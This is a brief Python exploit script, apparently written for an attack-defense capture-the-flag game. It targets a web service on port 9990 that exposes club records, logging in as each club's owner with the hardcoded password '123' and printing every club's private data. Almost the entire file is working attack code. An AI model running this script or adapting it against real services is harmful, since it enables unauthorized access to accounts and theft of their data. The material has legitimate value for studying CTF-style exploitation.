#!/usr/bin/env python3

import sys
import requests

ip = sys.argv[1]

host = f'http://{ip}:9990'
r = requests.get(host + '/klybi')



for c in r.json():
    sess = requests.Session()
    resp = sess.post(host + '/vhod', json = {'имя': c['босс'], 'пароль': '123'})
    data = sess.get(host + '/chezaklub', params={'клид': c['ид']})
    print(data.json(), flush=True)
    
